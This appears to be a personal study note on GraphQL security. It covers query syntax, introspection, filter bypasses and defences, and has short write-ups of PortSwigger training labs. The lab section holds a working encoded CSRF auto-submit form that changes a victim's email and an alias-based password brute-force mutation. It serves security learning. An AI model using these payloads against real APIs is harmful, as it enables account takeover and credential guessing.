GraphQL is an API query language that is designed to facilitate efficient communication between clients and servers. It enables the user to specify exactly what data they want in the response, helping to avoid the large response objects and multiple calls that can sometimes be seen with REST APIs.

![[Pasted image 20260131202225.png]]

The data described by a GraphQL schema can be manipulated using three types of operation:
- Queries fetch data.
- Mutations add, change, or remove data.
- Subscriptions are similar to queries, but set up a permanent connection by which a server can proactively push data to a client in the specified format. (webSockets)
## What is a GraphQL schema?
The example below shows a simple schema definition for a Product type. The `!` operator indicates that the field is non-nullable when called (that is, mandatory).
```
    type Product {
        id: ID!
        name: String!
        description: String!
        price: Int
    }
```

Schemas must also include at least one available query. Usually, they also contain details of available mutations.

## What are GraphQL queries?
GraphQL queries retrieve data from the data store. They are roughly equivalent to GET requests in a REST API.
- A `query` operation type. This is technically optional but encouraged, as it explicitly tells the server that the incoming request is a query.
- A query name. This can be anything you want. The query name is optional, but encouraged as it can help with debugging.
- A data structure. This is the data that the query should return.
- Optionally, one or more arguments. These are used to create queries that return details of a specific
For example:
```
	query myGetProductQuery {
		getProduct(id: 123) {
			name
			description
		}
	}
```
## What are GraphQL mutations?
Mutations change data in some way, either adding, deleting, or editing it. They are roughly equivalent to a REST API's POST, PUT, and DELETE methods.

  Example mutation request
```
    mutation {
        createProduct(name: "Flamin' Cocktail Glasses", listed: "yes") {
            id
            name
            listed
        }
    }
```

Example mutation response
```
    {
        "data": {
            "createProduct": {
                "id": 123,
                "name": "Flamin' Cocktail Glasses",
                "listed": "yes"
            }
        }
    }
```

## Components of queries and mutations
#### 1. Fields
example of fields `name.firstname`, `name.lastname`, `id`
```
    query myGetEmployeeQuery {
        getEmployees {
            id
            name {
                firstname
                lastname
            }
        }
    }
```
#### 2. Arguments
example of arguments employee ID which is `id`
```
    query myGetEmployeeQuery {
        getEmployees(id:1) {
            name {
                firstname
                lastname
            }
        }
    }
```
#### 3. Variables
example of variables is `id`. Variables enable you to pass dynamic arguments, rather than having arguments directly within the query itself.

When building a query or mutation that uses variables, you need to:
- Declare the variable and type.
- Add the variable name in the appropriate place in the query.
- Pass the variable key and value from the variable dictionary.

```
    query getEmployeeWithVariable($id: ID!) {
        getEmployees(id:$id) {
            name {
                firstname
                lastname
            }
         }
    }

    Variables:
    {
        "id": 1
    }
```

#### 4. Fragments
Fragments are reusable parts of queries or mutations. They contain a subset of the fields belonging to the associated type.
Once defined, they can be included in queries or mutations. If they are subsequently changed, the change is included in every query or mutation that calls the fragment.

```
    #Example fragment
    
    fragment productInfo on Product {
        id
        name
        listed
    }
```

```
    #Query calling the fragment

    query {
        getProduct(id: 1) {
            ...productInfo
            stock
        }
    }
```

```
    #Response including fragment fields

    {
        "data": {
            "getProduct": {
                "id": 1,
                "name": "Juice Extractor",
                "listed": "no",
                "stock": 5
            }
        }
    }
```


#### 5. Aliases
GraphQL objects can't contain multiple properties with the same name. For example, the following query is invalid because it tries to return the product type twice.
```
	query getProductDetails {
		getProduct(id: 1) {
			id
			name
		}
		getProduct(id: 2) {
			id
			name
		}
	}
```

Aliases enable you to bypass this restriction by explicitly naming the properties you want the API to return. You can use aliases to return multiple instances of the same type of object in one request. This helps to reduce the number of API calls needed.
```
	query getProductDetails {
		product1: getProduct(id: "1") {
			id
			name
		}
		product2: getProduct(id: "2") {
			id
			name
		}
	}
```

#### Directives
Directives allow to decorate or change behavior of a field within the documentation. The behavior change could affect how the field gets validated, processed or executed. It comes with two flavors: **query level** and **schema level** both types are declared with `@` 

##### Common schema and query level directives
| Directive Name | Description                                                                                    | Location     |
| -------------- | ---------------------------------------------------------------------------------------------- | ------------ |
| `@include`     | Conditionally includes a field or fragment in the query response only if the argument is true. | Query-Level  |
| `@skip`        | Conditionally omits a field or fragment from the query response if the argument is true.       | Query-Level  |
| `@deprecated`  | Marks a schema element as outdated and provides a rationale or alternative for consumers.      | Schema-Level |
| `@specifiedBy` | Links a custom scalar type definition to a formal specification URL describing its format.     | Schema-Level |

Schema level
```
type User {
  id: ID!
  oldUsername: String @deprecated(reason: "Use `username` instead.")
  username: String!
}
```

Query level
```
query GetUser($showEmail: Boolean!) {
  user(id: "1") {
    name
    email @include(if: $showEmail)
  }
}
```

## Subscriptions
Subscriptions are a special type of query. They enable clients to establish a long-lived connection with a server so that the server can then push real-time updates to the client without the need to continually poll for data. 
*Subscriptions are commonly implemented using WebSockets.*

## Introspection
Introspection is a built-in GraphQL function that enables you to query a server for information about the schema. It is commonly used by applications such as GraphQL IDEs and documentation generation tools. Like regular queries, you can specify the fields and structure of the response you want to be returned. For example, you might want the response to only contain the names of available mutations.

Introspection can represent a serious information disclosure risk, as it can be used to access potentially sensitive information (such as field descriptions) and help an attacker to learn how they can interact with the API. It is best practice for introspection to be disabled in production environments.
```
    #Introspection probe request

    {
        "query": "{__schema{queryType{name}}}"
    }
```

#### Common endpoint names
- `/graphql`
- `/api`
- `/api/graphql`
- `/graphql/api`
- `/graphql/graphql`
- `/v1/graphql`
- `/graphiql`
- `/playground`
If these common endpoints don't return a GraphQL response, you could also try appending `/v1` to the path.

### Suggestions
Even if introspection is entirely disabled, you can sometimes use suggestions to glean information on an API's structure.
Suggestions are a feature of the **Apollo GraphQL platform** in which the server can suggest query amendments in error messages. These are generally used where a query is slightly incorrect but still recognizable (for example, `There is no entry for 'productInfo'. Did you mean 'productInformation' instead?)`.

You can potentially glean useful information from this, as the response is effectively giving away valid parts of the schema.

*Clairvoyance* is a tool that uses suggestions to automatically recover all or part of a GraphQL schema, even when introspection is disabled. This makes it significantly less time consuming to piece together information from suggestion responses.
*In Apollo Server v4 and above, you can disable suggestions using the*


## Bypassing GraphQL introspection defenses
inserting a special character after the __schema keyword.
- spaces
- newlines
- commas
- Try a GET request, or a POST request with a content-type of `x-www-form-urlencoded`

```
    #Introspection query with newline

    {
        "query": "query{__schema
        {queryType{name}}}"
    }
```

```
    # Introspection probe as GET request

    GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
```

## Labs
* #Portswigger
	1. **Accessing private GraphQL posts** #APPRENTICE 
		**First:**
		after inspecting the response of the GraphQL post with id 3 was not there so i sent a request with variable id 3 and it retrieved the response but i wanted the password value from it so moved to the second step
		**Second:**
		Running a full introspection query and found all fields and the field that i was search for `postPassword` and i added it to the first query and i found the value in the response
	2. **Accidental exposure of private GraphQL fields** #PRACTITIONER 
		after inspecting the introspection query there was a query to get user information using id as an argument so i send id 1 and i got the admin info
	3. **Finding a hidden GraphQL endpoint** #PRACTITIONER 
		i sent the same full introspection query but i have add new line after `__schema` so the regex did not catch the payload and i found the hidden GraphQL using the common endpoints
	4. **Bypassing GraphQL brute force protections** #PRACTITIONER 
		i used aliases to add multi query and send the request to brute force the password and it worked {my-arrow}
	5. **Performing CSRF exploits over GraphQL** #PRACTITIONER 
		i just change the JSON into normal request using query as a parameter and turn it into CSRF payload and i encoded it as HTML
		*Payload*		
		`<form method="POST" action="https://0a4800bb04f508ea804130c800b3001f.web-security-academy.net/graphql/v1">`
		`<input name="query" value="&#x20;&#x20;&#x20;&#x20;&#x6d;&#x75;&#x74;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x20;&#x63;&#x68;&#x61;&#x6e;&#x67;&#x65;&#x45;&#x6d;&#x61;&#x69;&#x6c;&#x20;&#x7b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x63;&#x68;&#x61;&#x6e;&#x67;&#x65;&#x45;&#x6d;&#x61;&#x69;&#x6c;&#x28;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x3a;&#x20;&#x7b;&#x65;&#x6d;&#x61;&#x69;&#x6c;&#x3a;&#x20;&#x22;&#x61;&#x64;&#x65;&#x6c;&#x40;&#x36;&#x31;&#x2e;&#x63;&#x6f;&#x6d;&#x22;&#x7d;&#x29;&#x20;&#x7b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x65;&#x6d;&#x61;&#x69;&#x6c;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x7d;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x7d;">`
		`</form>`
		`<script>document.forms[0].submit();</script>`

##### Lab 4 {my-arrow|red}
```
	mutation {
        bruteforce0:login(input:{password: "123456", username: "carlos"}) {
              token
              success
          }

          bruteforce1:login(input:{password: "password", username: "carlos"}) {
              token
              success
          }

    ...

          bruteforce99:login(input:{password: "12345678", username: "carlos"}) {
              token
              success
          }
    }
```



## Notes:
- It is best practice for production GraphQL endpoints to only accept POST requests that have a content-type of `application/json`, as this helps to protect against CSRF vulnerabilities.
- You can view relationships between schema entities more easily using a GraphQL visualizer.

## Preventing GraphQL attacks
1. disable introspection
2. If your API is intended for use by the general public then you will likely need to leave introspection enabled. However, you should review the API's schema to make sure that it does not expose unintended fields to the public
3. Make sure that suggestions are disabled
4. Make sure that your API's schema does not expose any private user fields, such as email addresses or user IDs.
5. Limit the query depth of your API's queries. The term "query depth" refers to the number of levels of nesting within a query. Heavily-nested queries can have significant performance implications, and can potentially provide an opportunity for DoS attacks if they are accepted. By limiting the query depth your API accepts, you can reduce the chances of this happening.
6. Configure operation limits. Operation limits enable you to configure the maximum number of unique fields, aliases, and root fields that your API can accept.
7. Configure the maximum amount of bytes a query can contain.
8. Consider implementing cost analysis on your API. Cost analysis is a process whereby a library application identifies the resource cost associated with running queries as they are received. If a query would be too computationally complex to run, the API drops it.
#### Preventing CSRF over GraphQL
- Your API only accepts queries over JSON-encoded POST.
- The API validates that content provided matches the supplied content type.
- The API has a secure CSRF token mechanism.



## Techniques
1. detect the GraphQL endpoint and interfaces like `graphiql` or `playground` (it always response even when the query is invalid)
	1. use `graphw00f` to detect endpoints against wordlist
2. fingerprint the GraphQL technology using `graphw00f` 
3. send normal introspection query
#### DOS
1. circular query
##### Questions to answer
 1. Does the web server have GraphQL API ?
 2. On which endpoint ?
 3. What language does the GraphQL implementation written in ?
 4. What implementation of GraphQL is running on the target ?
 5. Is the implementation known to be vulnerable ?
 6. What type of defenses exist for the specific GraphQL implementation ?
 7. What are some of out-of-the-box default configuration settings of this implementation ?
 8. Does GraphQL have additional security protection layers in place ?



##### Full introspection query
 ```
	#Full introspection query
 
    query IntrospectionQuery {
        __schema {
            queryType {
                name
            }
            mutationType {
                name
            }
            subscriptionType {
                name
            }
            types {
             ...FullType
            }
            directives {
                name
                description
                args {
                    ...InputValue
            }
            onOperation  #Often needs to be deleted to run query
            onFragment   #Often needs to be deleted to run query
            onField      #Often needs to be deleted to run query
            }
        }
    }

    fragment FullType on __Type {
        kind
        name
        description
        fields(includeDeprecated: true) {
            name
            description
            args {
                ...InputValue
            }
            type {
                ...TypeRef
            }
            isDeprecated
            deprecationReason
        }
        inputFields {
            ...InputValue
        }
        interfaces {
            ...TypeRef
        }
        enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
        }
        possibleTypes {
            ...TypeRef
        }
    }

    fragment InputValue on __InputValue {
        name
        description
        type {
            ...TypeRef
        }
        defaultValue
    }

    fragment TypeRef on __Type {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
                ofType {
                    kind
                    name
                }
            }
        }
    }
```